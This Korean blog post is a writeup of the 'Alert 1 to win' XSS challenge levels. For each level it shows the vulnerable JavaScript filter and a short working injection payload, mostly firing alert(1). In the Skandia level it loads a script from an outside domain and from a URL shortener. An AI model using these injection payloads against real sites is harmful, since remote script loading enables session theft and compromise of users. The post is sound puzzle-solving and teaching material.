---
layout: post
title: "XSS Challenges writeup - Alert 1 to win (Part 1)"
description: XSS Challenges writeup - Alert 1 to win (Part 1)
headline: XSS Challenges writeup - Alert 1 to win (Part 1)
modified: 2017-04-16
category: web xss
comments: true
featured: true
---


[Alert 1 to win](https://alf.nu/)을 풀어 봤습니다.
Alert 1 to win은 unsafe한 javascript에 입력값을 조작하여 alert 1을 띄우는 문제로 짧은 exploit code가 높은 점수를 얻는 구조입니다.

문제의 순서는 언제든지 바뀔 수 있습니다.

# warmup
```
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

입력 값이 별도의 필터링 없이 그대로 출력되는 구조 입니다. 간단히 더블쿼터(")만 escape하면 됩니다.


처음으로 작성했던 Payload는 `");alert(1)//`(13자리) 입니다. 하지만 payload 길이가 짧을수록 점수 배점이 높은 구조입니다.

다시 작성한 payload는 `"+alert(1)+"`(12자리)입니다.

# Adobe
```javascript
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```
warmup 문제에 더블쿼터를(")를 역슬러쉬 더블쿼터(\")으로 치환하는 구문이 추가된 문제입니다.

역슬래시에 다시 역슬래시를 추가해서 문자열로 바꾸면 됩니다.

첫번째 작성했던 페이로드를 살짝 수정했습니다. payload `\");alert(1)//`(14자리)

# JSON
```javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```
입력값을 JSON.stringify를 통해 치환합니다. JSON.stringify는 JSON에서 사용되는 더블쿼터(")에 역슬래시를 자동으로 추가합니다. 물론 더블쿼터를 탈출할 수 있는 역슬래시 또한 자동으로 역슬래시가 붙습니다.
단점으로는 화살괄호(<>)는 치환하지 못합니다.

payload : `</script><script>alert(1)//`(27자리)

현재 1등이 1점인데 이건 버그 같습니다 :(

# JavaScript
```javascript
function escape(s) {
  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
  console.log(url);

  var a = document.createElement('a');
  a.href = url;
  document.body.appendChild(a);
  a.click();
}
```
입력받은 문자열을 a tag의 href 값에 삽입되는 경우입니다. href 태그에 `javascript:`(pseudo-protocol) 로 명시하고 자바스크립트를 적으면 하이퍼링크에서 바로 자바스크립트를 실행할 수 있습니다.

브라우저 주소창에 `javascript:alert(1)`를 적으면 실행되는것을 알 수 있습니다. ㅎ

여튼 서론이 길었는데 결론적으로 pseudo-protocol로 실행되는 구문은 `javascript:console.log("")`입니다.

이 문제는 브라우저 주소창에서 테스트해보면 쉽습니다.
주소창에 `javascript:console.log("")`를 만들어 둔 뒤 더블쿼터(")를 escape 할 방법을 찾아내면 됩니다. 주소창에서 입력되는 URL Encode 문자열은 원본 문자열로 치환되기 때문에 더블쿼터(")의 URL Encode된 %22로 더블쿼터(")를 탈출 할 수 있습니다.

`javascript:console.log("%22);alert(1)//")`를 브라우저 주소창에 쳐보면 쉽게 이해가 됩니다.

payload `%22);alert(1)//`(15자리)

이것도 점수에 문제가 좀 있네요 :(

# Markdown
```javascript
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```
지금부터 슬슬 머리가 아파오네요. 첫번째 치환문 덕분에 전역적으로 더블쿼터(")와 왼쪽화살괄호(<)를 사용하지 못합니다.

두번째 치환문은 `http://`로 시작하는 문자열을 `'<a href="$1">$1</a>`의 $1과 치환합니다.
예를 들어 `http://a` 로 입력하면 `<a href="http://a">http://a</a>`가 나옵니다.
세번째 치환문은 `[[a|b]]`와 같은 입력값을 `<img alt="b" src="a.gif">`로 치환해줍니다.

따라서 `http://[[a|b]]` 를 입력하면 아래와 같이 나옵니다.

```HTML
<a href="http://<img alt="b" src="a.gif">">http://<img alt="b" src="a.gif"></a>
```

더블쿼터(")가 b에서 깨지게 됩니다. 따라서 b를 입력한 부분에서 원하는 event 핸들러를 적을 수 있습니다.

완성한 payload `http://[[z|onclick='alert(1)']]`(31자리)

> 하단의 iframe에서 클릭합니다. 클릭이 안되면 css를 좀 만집니다 :(

사람들이 최종적으로 30자리 Score를 얻었기에 조금더 연구해봤습니다.

완성한 payload `http://[[z|onblur='alert(1)']]`(30자리)

덕분에 3위권 입성!!



# DOM
```
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```
입력값을 # 기준으로 잘라서 앞의 문자열은 document['create'+앞문자열] 하나는 만들어진 인자값으로 넘겨줍니다.

따라서 `TextNode#foo` 라고 입력하면 foo 라는 문자열이 담긴 DIV 엘리먼트를 출력할 수 있습니다.
Create로 만들 수 있는 종류는 아래와 같습니다.

```
createAttribute()
createCDATASection()
createComment()
createDocumentFragment()
createElement()
createElementNS()
createEntityReference()
createEvent()
createExpression()
createNodeIterator()
createNSResolver()
createProcessingInstruction()
createRange()
createTextNode()
createTouch()
createTouchList()
createTreeWalker()
```

이중 가장 쉬워보이는 Comment를 이용해서 payload를 작성했습니다.
payload `Comment#--><script>alert(1)</script>`(36자리)

순위권이긴 하지만 생각보다 순위 ㅠ_ㅠ 다른 방법을 모르겠내요.... 참고로 1등은 32자리

# Callback
```
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```
입력값이 a-Z,[,],'로 제한되어 있는 상태이다. 또한 < 도 사용하지 못합니다.

입출력 예시는 아래와 같습니다.

입력값 `callback#userdata`
출력값 `<script>callback({"userdata":"userdata"})</script>`

싱글쿼터를 사용할 수 있기 때문에 쉽게 해결 가능합니다.

payload : `'#';alert(1)//`(14자리)


# Skandia
```
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```
입력값이 자동으로 대문자로 치환된다. js는 대소문자를 구분하기 때문에 함수의 대부분을 사용할 수 없게 됩니다.

그냥 내 사이트에 올리고 실행시킴 ^-'

payload : `</script><script src="http://xss.nisambot.com/1.JS"></script>`(61자리)

만약 도메인이 더 짧았으면 더 줄일 수 있을것 같은데....

payload : `</script><script src="http://goo.gl/QNAFNO"></script>`(53자리)

구글 Short URL을 이용해 조금더 축소 성공!

많은 사람들은 난독화를 이용해서 해결 한 것 같습니다.


Part 2에서 계속...!